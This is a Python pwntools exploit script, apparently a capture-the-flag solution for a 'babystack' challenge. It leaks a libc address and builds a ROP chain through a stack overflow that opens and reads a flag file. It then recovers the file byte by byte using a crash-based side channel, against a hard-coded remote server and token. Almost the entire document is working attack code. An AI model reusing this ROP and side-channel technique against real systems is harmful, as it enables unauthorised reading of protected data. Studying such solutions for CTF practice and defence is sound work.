from pwn import *
import string
#context.log_level = 'debug'
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc.so')
def guess(idx, ch):
    payload = 'a'*40
    payload += p64(0x0000000000001b92+libc_base) # pop rdx ; ret
    payload += p64(0x00000000003c4080+libc_base) # @ .data
    payload += p64(0x0000000000033544+libc_base) # pop rax ; ret
    payload += './flag\x00\x00'
    payload += p64(0x000000000002e19c+libc_base) # mov qword ptr [rdx], rax ; ret

    payload += p64(0x0000000000021102+libc_base) # pop rdi ; ret
    payload += p64(0x00000000003c4080+libc_base) # @ .data
    payload += p64(0x00000000000202e8+libc_base) # pop rsi ; ret
    payload += '\x00'*8
    payload += p64(0x0000000000001b92+libc_base) # pop rdx ; ret
    payload += '\x00'*8
    payload += p64(0x00000000000f7000+libc_base) # open


    payload += p64(0x0000000000021102+libc_base) # pop rdi ; ret
    payload += p64(3)
    payload += p64(0x00000000000202e8+libc_base) # pop rsi ; ret
    payload += p64(0x00000000003c4080+libc_base) # @ .data
    payload += p64(0x0000000000001b92+libc_base) # pop rdx ; ret
    payload += p64(0x100)
    payload += p64(0x00000000000f7220+libc_base) # read

    payload += p64(0x00000000000202e8+libc_base) # pop rsi ; ret
    payload += p64(0x00000000003c4080+libc_base + idx) # @ .data
    payload += p64(0x0000000000021102+libc_base) # pop rdi ; ret
    payload += 'aaaaaaaa'
    payload += p64(0x00000000000d20a3+libc_base) # pop rcx ; ret
    payload += p64(ord(ch))

    payload += p64(0x0000000000001b92+libc_base) # pop rdx ; ret
    payload += p64(0x00000000003c4080+libc_base+idx+8) # @ .data
    payload += p64(0x0000000000033544+libc_base) # pop rax ; ret
    payload += '00000000'
    payload += p64(0x000000000002e19c+libc_base) # mov qword ptr [rdx], rax ; ret


    payload += p64(0x00000000000D72CE+libc_base)
    payload += 'aaaaaaaa'
    payload += p64(0x0000000000021102+libc_base) # pop rdi ; ret
    payload += p64(0)
    payload += p64(0x00000000000202e8+libc_base) # pop rsi ; ret
    payload += p64(0x00000000003c4080+libc_base) # @ .data
    payload += p64(0x0000000000001b92+libc_base) # pop rdx ; ret
    payload += p64(0x100)
    payload += p64(0x00000000000f7220+libc_base) # read
    return payload
libc_base = 0

def foo(idx, ch):
    global libc_base
    print "guess",ch
    #t = process("babystack")
    t.recvline()

    t.sendline('6295592')   # puts

    puts = t.recvline()
    puts = int(puts)
    libc_base = puts - libc.symbols['puts']

    print hex(libc_base)
    payload = guess(idx,ch)

    t.sendline(payload)
    try:
        a = t.recvuntil("Segmentation",timeout = 0.7)
        if a == '':
            t.sendline('123')
            t.recvline()
            return False
        t.recvline()
        return True
    except EOFError:
        return True
    

def foo2(idx):
    for i in '0123456789abcdef'+'htf{}':
        if foo(idx, i):
            return i

#print foo(0,'t')
#exit(0)
t = remote('47.100.64.171', 20001)
t.recvuntil('token\n')
t.sendline('UZOp5K1snmcs9JcVOKq1Bbu9xfpLAkNY')
flag = ''
for i in range(0,0x100):
    ch = foo2(i)
    if ch == '\x00'or ch == None:
        break
    flag += ch
    print 'flag',flag
print flag
